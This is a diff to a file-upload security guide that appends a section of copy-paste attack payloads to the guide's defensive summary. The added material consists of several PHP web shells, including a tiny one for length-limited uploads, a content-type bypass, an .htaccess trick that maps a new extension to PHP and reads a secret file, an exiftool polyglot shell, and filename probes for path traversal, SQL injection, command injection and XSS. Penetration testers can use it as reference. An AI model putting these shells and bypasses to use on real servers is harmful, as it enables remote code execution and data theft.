@@ -186,3 +186,61 @@ Upload surfaces are high risk: server-side execution (RCE), stored XSS, malware 
 ## Summary
 
 Secure uploads are a pipeline property. Enforce strict type, size, and header controls; transform or strip active content; never execute or inline-render untrusted uploads; and keep storage private with controlled, signed access.
+
+
+
+## Additional Techniques — ported from WebSkills (file-upload)
+
+Copy-paste payloads to accompany the concept sections above.
+
+**PHP web shells (drop where PHP executes):**
+```php
+<?php system($_GET["cmd"]);?>          // ?cmd=ls -la
+<?=`$_GET[0]`?>                        // ?0=command
+<?=`$_POST[0]`?>                       // curl -X POST .../shell.php -d "0=command"
+<?=`{$_REQUEST['_']}`?>                // ?_=command
+```
+Tiny shell for **content-length-limited** uploads: `<?=`$_GET[x]`?>`.
+
+**Content-type bypass:** keep the malicious extension/body, but set an allowed image MIME on the multipart part:
+```
+Content-Type: image/jpeg   (or image/gif, image/png)
+```
+
+**Extension-blacklist bypass via .htaccess** (two-step: map a novel extension to PHP, then upload it):
+```http
+Content-Disposition: form-data; name="avatar"; filename=".htaccess"
+Content-Type: text/plain
+
+AddType application/x-httpd-php .l33t
+---
+Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
+Content-Type: application/octet-stream
+
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+
+**exiftool polyglot web shell** (valid image + PHP in a metadata comment; rename to .php if serving path allows):
+```
+exiftool -Comment="<?php system($_GET['cmd']); ?>" clean.png -o polyglot.php
+```
+
+**Filename-injection probes** (test the *filename* field itself as an injection vector, independent of file content):
+- Path traversal: `../../../logo.png`, `../../etc/passwd%00.png`
+- SQLi: `'sleep(10).jpg`, `sleep(10)-- -.jpg`
+- Command injection: `; sleep 10;.jpg`
+- XSS (if filename is rendered in UI): `"><svg onload=alert(document.domain)>.svg`
+
+**Impact-by-extension quick map** (pick payload class by what the upload accepts):
+```
+php/asp/aspx/php3/php5 → web shell / RCE
+svg                    → stored XSS, SSRF, XXE (ImageTragick)
+gif                    → stored XSS, SSRF
+html/js                → HTML injection, XSS, open redirect
+csv                    → CSV/formula injection
+xml                    → XXE
+avi                    → LFI, SSRF
+zip                    → RCE via LFI, zip-slip, zip-bomb DoS
+pdf/pptx               → SSRF, blind XXE
+png/jpeg               → pixel-flood DoS; EXIF-not-stripped info leak
+```
